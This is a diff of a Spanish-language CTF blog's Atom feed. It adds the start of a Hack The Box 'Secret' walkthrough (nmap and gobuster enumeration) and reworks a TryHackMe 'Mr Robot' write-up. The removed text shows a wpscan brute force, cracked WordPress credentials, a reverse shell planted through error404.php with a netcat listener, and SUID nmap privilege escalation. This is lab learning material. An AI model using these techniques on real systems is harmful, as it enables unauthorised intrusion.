@@ -1,4 +1,100 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-07T09:38:46-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pentester - Ctf’s</title><subtitle>Ingeniero de sistemas, autodidacta, entusidasta por la seguridad informatica.</subtitle><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><entry><title type="html">tryhackme: Mr Robot</title><link href="http://localhost:4000/MrRobot/" rel="alternate" type="text/html" title="tryhackme: Mr Robot" /><published>2021-11-01T00:00:00-05:00</published><updated>2021-11-01T00:00:00-05:00</updated><id>http://localhost:4000/MrRobot</id><content type="html" xml:base="http://localhost:4000/MrRobot/">&lt;h1 id=&quot;comprobaremos-que-la-maquina-se-encuentre-activa&quot;&gt;Comprobaremos que la maquina se encuentre activa&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-09T23:46:54-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pentester - Ctf’s</title><subtitle>Ingeniero de sistemas, autodidacta, entusidasta por la seguridad informatica.</subtitle><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><entry><title type="html">Hackthebox: Secret</title><link href="http://localhost:4000/Secret/" rel="alternate" type="text/html" title="Hackthebox: Secret" /><published>2021-11-09T00:00:00-05:00</published><updated>2021-11-09T00:00:00-05:00</updated><id>http://localhost:4000/Secret</id><content type="html" xml:base="http://localhost:4000/Secret/">&lt;h2 id=&quot;iniciamos-comprobando-que-la-maquina-este-activa-antes-que-nada&quot;&gt;Iniciamos comprobando que la maquina este activa antes que nada&lt;/h2&gt;
+
+&lt;p&gt;hacemos el envio de un paquete mediante ping para confirmar que la maquina esta activa, al mismo tiempo comprovamos que estamos
+frente a una maquina linux mediante el &lt;em&gt;ttl&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.11.120
+PING 10.10.11.120 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.11.120&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.11.120: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;101 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.11.120 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 101.116/101.116/101.116/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;2do metodo, usando la herramienta &lt;em&gt;wichSystem.py&lt;/em&gt; directamente esta nos dice que &lt;em&gt;OS&lt;/em&gt; corre en la maquina&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wichSystem.py 10.10.11.120
+
+10.10.11.120 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 63&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Linux
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;hacemos-un-escaneo-con-nmap-para-ver-que-puertos-tiene-abiertos&quot;&gt;Hacemos un escaneo con nmap para ver que puertos tiene abiertos&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; 10.10.11.120 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+
+❯ extractPorts allPorts
+───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.11.120
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80,3000
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+   8   │ 
+───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+&lt;span class=&quot;sb&quot;&gt;``&lt;/span&gt;
+
+mediante &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;extractPorts&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; vemos el resultado del escaneo de nmap y nos copia los puertos en la _clipboard_ vemos que tenemos 3 
+puertos abiertos, probaremos unos _scritps_ basicos de nmap para ver que servicios corren y que posibles vulnerabilidades existen
+
+&lt;span class=&quot;sb&quot;&gt;```&lt;/span&gt;bash
+❯ nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80,3000 10.10.11.120
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-09 07:45 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.120
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.10s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp   open  http    nginx 1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-server-header: nginx/1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: DUMB Docs
+3000/tcp open  http    Node.js &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Express middleware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: DUMB Docs
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;15.91 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;El resultado nos da información interesante, sin embargo probaremos &lt;em&gt;gobuster&lt;/em&gt; ya que tiene un pagina web&lt;/p&gt;
+
+&lt;p&gt;luego de la espera no encontramos nada que nos pueda ser de mayor utilidad&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.11.120/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;--no-error&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster.txt
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.1.0
+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:                     http://10.10.11.120/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:                  GET
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:                 10
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Negative Status codes:   404
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:              gobuster/3.1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:                 10s
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/11/09 07:55:45 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+/download             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 183] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /download/]
+/docs                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 20720]               
+/assets               &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 179] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /assets/]  
+/api                  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 93]                  
+/Docs                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 20720]               
+/API                  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 93]                  
+/DOCS                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 20720]               
+                                                                
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/11/09 08:35:09 Finished
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="hackthebox" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">tryhackme: Mr Robot</title><link href="http://localhost:4000/MrRobot/" rel="alternate" type="text/html" title="tryhackme: Mr Robot" /><published>2021-11-01T00:00:00-05:00</published><updated>2021-11-01T00:00:00-05:00</updated><id>http://localhost:4000/MrRobot</id><content type="html" xml:base="http://localhost:4000/MrRobot/">&lt;h1 id=&quot;comprobaremos-que-la-maquina-se-encuentre-activa&quot;&gt;Comprobaremos que la maquina se encuentre activa&lt;/h1&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.115.49
 PING 10.10.115.49 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.115.49&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
@@ -211,171 +307,17 @@ ls
 robot@linux:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;ke&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;ke&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
 82xc7x956x84fx93xxxbxdexebx9f959
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="web" /><category term="wordpress" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">tryhackme: Mr Robot</title><link href="http://localhost:4000/MrRobot/" rel="alternate" type="text/html" title="tryhackme: Mr Robot" /><published>2021-11-01T00:00:00-05:00</published><updated>2021-11-01T00:00:00-05:00</updated><id>http://localhost:4000/MrRobot</id><content type="html" xml:base="http://localhost:4000/MrRobot/"># Comprobaremos que la maquina se encuentre activa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-```bash
-❯ ping -c 1 10.10.115.49
-PING 10.10.115.49 (10.10.115.49) 56(84) bytes of data.
-64 bytes from 10.10.115.49: icmp_seq=1 ttl=63 time=162 ms
+&lt;h3 id=&quot;ahora-a-buscar-la-manera-de-obtener-privilegios-root&quot;&gt;ahora a buscar la manera de obtener privilegios root&lt;/h3&gt;
 
---- 10.10.115.49 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 161.950/161.950/161.950/0.000 ms
-```
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robot@linux:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;--perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
 
-Efectivamente, vemos que recibio el paquete enviado, ahora comprabaremos que *OS* tiene la maquina
+/usr/local/bin/nmap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-```bash
-❯ wichSystem.py 10.10.115.49
-
-10.10.115.49 (ttl -&gt; 63): Linux
-```
-
-Ya hemos confirmado que estamos con una maquina _linux_ mediante 2 formas diferentes
-
-- 1 mediante el *ttl* que obtuvimos del comando ping
-- 2 la uilidad -[WichSystem.py](s4vitar.github.io)
-
-# Realizamos un escaneo de puertos
-
-```bash
-❯ sudo nmap --open --min-rate 5000 -Pn -n -sS 10.10.115.49 -oG allPorts
-Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-01 14:30 -05
-Failed to resolve &quot;n&quot;.
-Nmap scan report for 10.10.115.49
-Host is up (0.19s latency).
-Not shown: 997 filtered tcp ports (no-response), 1 closed tcp port (reset)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT    STATE SERVICE
-80/tcp  open  http
-443/tcp open  https
-
-Nmap done: 1 IP address (1 host up) scanned in 3.03 seconds
-```
-
-## obtenemos una mejor vista de los puertos abiertos mediante la utilidad *extractPors*, ademas de que nos los copia
-
-```bash
-❯ extractPorts allPorts
-───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ [*] Extracting information...
-   3   │ 
-   4   │     [*] IP Address: 10.10.115.49
-   5   │     [*] Open ports: 80,443
-   6   │ 
-   7   │ [*] Ports copied to clipboard
-   8   │ 
-───────┴──────────────────────────────────
-```
-Buscamos posibles vulnerabilidades en los puertos con *nmap*
-
-```bash
-❯ nmap -sC -sV -p80,443 10.10.115.49
-Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-01 14:31 -05
-Nmap scan report for 10.10.115.49
-Host is up (0.17s latency).
-
-PORT    STATE SERVICE  VERSION
-80/tcp  open  http     Apache httpd
-|_http-server-header: Apache
-|_http-title: Site doesn't have a title (text/html).
-443/tcp open  ssl/http Apache httpd
-|_http-title: Site doesn't have a title (text/html).
-|_http-server-header: Apache
-| ssl-cert: Subject: commonName=www.example.com
-| Not valid before: 2015-09-16T10:45:03
-|_Not valid after:  2025-09-13T10:45:03
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 22.80 seconds
-```
-
-vemos la pagina web del sitio y miramos a ver que nos llama la atencion
-
-![server.png](/assets/images/MrRobot/server.txt)
-
-buscamos en *robots.txt*
-
-![robots.txt](/assets/images/MrRobot/robots.txt)
-
-encontramos 2 posibles rutas
-
-```bash
-User-agent: *
- fsocity.dic
- key-1-of-3.txt
-```
-
-- *fsocity.dic* contiene posibles nombres de usuarios y/o contraseñas
-- *key-1-of-3.txt* contiene una la primer _flag_
-
-
-# hacemos una pausa para ver los posibles *vectores de ataque* que tenemos
-
-mientras esperamos que termine el escaneo con *gobuster* intentaremos hacer una identificación de usuarios mediante el login ya que
-nos permite una enumeración de usuarios
-
-- luego de probar varios posibles usuarios encontramos que *Elliot* es un usuario valido (bastante logico, si recordamos el nombre
-de la maquina)
-
-vamos ver cuantas lineas tiene el diccionario _fsocity.dic_ 
-
-```bash
-❯ cat fsocity.dic | wc -l
-858160
-```
-es un archivo bastante grande, por si acaso eliminaremos los duplicados
-
-- sort: ordemamos las parabras
-- uniq: eliminamos las repetidas
-Vemos que ahora solo tenemos 11.451 lineas 
-
-```bash
-❯ sort fsocity.dic | uniq &gt; users.txt
-❯ wc -l users.txt
-11451 users.txt
-```
-
-### ahora pasaremos a intentar hacerle fuerza bruta al login con el archivo fsocity.dic (luego del tratamiento, users.txt)encontrado antes
-
-- primero realize brute force con *hydra*, pero luego de mucho tiempo lo cancele e intente con *wpscan* y tarde menos de 5 minutos
-
-```bash
-wpscan --url http://10.10.1.9 -t 50 -U elliot -P users.txt
-
-[!] Valid Combinations Found:
- | Username: elliot, Password: ER28-0652
-```
-luego de la espera, tenemos el usuario *Elliot* y la contraseña *ER28-0652*
-
-![imagen worpress.png](/assets/images/MrRobot/worpress.png)
-
-Miraremos la pagina de administración e inspeccinamos a ver que podemos hacer para obtener una *reverse shell*
-
-- intentare usar la pagina de *error404.php* para ganar acceso desde mi maquina
-
-editamos el archivo _error404.php_ con nuestra *shell* y pongo mi maquina en escucha
-
-## Ganamos acceso
-
-```bash
-❯ nc -nlvp 1234
-listening on [any] 1234 ...
-connect to [10.9.50.132] from (UNKNOWN) [10.10.106.35] 46851
-Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
- 12:56:23 up 52 min,  0 users,  load average: 0.00, 0.01, 0.05
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
-/bin/sh: 0: can't access tty; job control turned off
-```
-
-- Usamos python para cambiar la terminal por una un poco &quot;mejor&quot;
-
-```bash
-```</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="web" /><category term="wordpress" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">tryhackme: Kenobi</title><link href="http://localhost:4000/kenobi/" rel="alternate" type="text/html" title="tryhackme: Kenobi" /><published>2021-10-25T00:00:00-05:00</published><updated>2021-10-25T00:00:00-05:00</updated><id>http://localhost:4000/kenobi</id><content type="html" xml:base="http://localhost:4000/kenobi/">&lt;h2 id=&quot;comprovamos-que-la-maquina-este-iniciada-correctamente-enviandole-un-ping&quot;&gt;Comprovamos que la maquina este iniciada correctamente enviandole un &lt;em&gt;ping&lt;/em&gt;&lt;/h2&gt;
+&lt;p&gt;llama la atención que &lt;em&gt;nmap&lt;/em&gt; tenga privilegios SUID, probar usar &lt;a href=&quot;https://gtfobins.github.io/gtfobins/nmap/#suid&quot;&gt;gtfobis&lt;/a&gt; 
+para abusar de dichos privilegios&lt;/p&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="web" /><category term="wordpress" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">tryhackme: Kenobi</title><link href="http://localhost:4000/kenobi/" rel="alternate" type="text/html" title="tryhackme: Kenobi" /><published>2021-10-25T00:00:00-05:00</published><updated>2021-10-25T00:00:00-05:00</updated><id>http://localhost:4000/kenobi</id><content type="html" xml:base="http://localhost:4000/kenobi/">&lt;h2 id=&quot;comprovamos-que-la-maquina-este-iniciada-correctamente-enviandole-un-ping&quot;&gt;Comprovamos que la maquina este iniciada correctamente enviandole un &lt;em&gt;ping&lt;/em&gt;&lt;/h2&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.37.122
 PING 10.10.37.122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.37.122&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
